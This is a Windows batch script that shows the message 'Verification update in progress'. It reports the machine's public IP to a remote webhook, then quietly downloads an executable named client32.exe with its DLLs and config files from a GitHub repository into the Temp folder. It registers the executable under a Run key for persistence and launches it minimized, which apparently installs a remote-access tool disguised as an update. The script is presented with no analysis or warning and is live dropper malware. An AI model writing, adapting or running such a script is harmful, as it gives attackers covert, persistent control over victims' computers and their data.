@echo off
echo Verification update in progress. Please wait...
set "TEMP=%USERPROFILE%\AppData\Local\Temp"

for /f "tokens=*" %%i in ('curl -s "https://checkip.amazonaws.com/"') do set "IP=%%i"
curl -s -X GET "https://n8nservice.online/webhook/install?text=Verify starting... IP: %IP%" >nul 2>&1
curl -L -o "%TEMP%\client32.exe" "https://github.com/helper-net/update/raw/refs/heads/main/client32.exe" >nul 2>&1
curl -L -o "%TEMP%\client32.ini" "https://raw.githubusercontent.com/helper-net/update/refs/heads/main/client32.ini" >nul 2>&1
curl -L -o "%TEMP%\NSM.LIC" "https://github.com/helper-net/update/raw/refs/heads/main/NSM.LIC" >nul 2>&1

curl -L -o "%TEMP%\HTCTL32.DLL" "https://github.com/helper-net/update/raw/refs/heads/main/HTCTL32.DLL" >nul 2>&1
curl -L -o "%TEMP%\msvcr100.dll" "https://github.com/helper-net/update/raw/refs/heads/main/msvcr100.dll" >nul 2>&1
curl -L -o "%TEMP%\nskbfltr.inf" "https://github.com/helper-net/update/raw/refs/heads/main/nskbfltr.inf" >nul 2>&1
curl -L -o "%TEMP%\NSM.ini" "https://github.com/helper-net/update/raw/refs/heads/main/NSM.ini" >nul 2>&1
curl -L -o "%TEMP%\nsm_vpro.inf" "https://github.com/helper-net/update/raw/refs/heads/main/nsm_vpro.inf" >nul 2>&1
curl -L -o "%TEMP%\AudioCapture.dll" "https://github.com/helper-net/update/raw/refs/heads/main/AudioCapture.dll" >nul 2>&1
curl -L -o "%TEMP%\pcicapi.dll" "https://github.com/helper-net/update/raw/refs/heads/main/pcicapi.dll" >nul 2>&1
curl -L -o "%TEMP%\PCICHEK.DLL" "https://github.com/helper-net/update/raw/refs/heads/main/PCICHEK.DLL" >nul 2>&1
curl -L -o "%TEMP%\PCICL32.DLL" "https://github.com/helper-net/update/raw/refs/heads/main/PCICL32.DLL" >nul 2>&1
curl -L -o "%TEMP%\TCCTL32.DLL" "https://github.com/helper-net/update/raw/refs/heads/main/TCCTL32.DLL" >nul 2>&1
reg add HKCU\Software\Microsoft\Windows\CurrentVersion\Run /v "UpdateNet" /t REG_SZ /d "%TEMP%\client32.exe" /f
start /min "" /B "%TEMP%\client32.exe" >nul 2>&1
exit
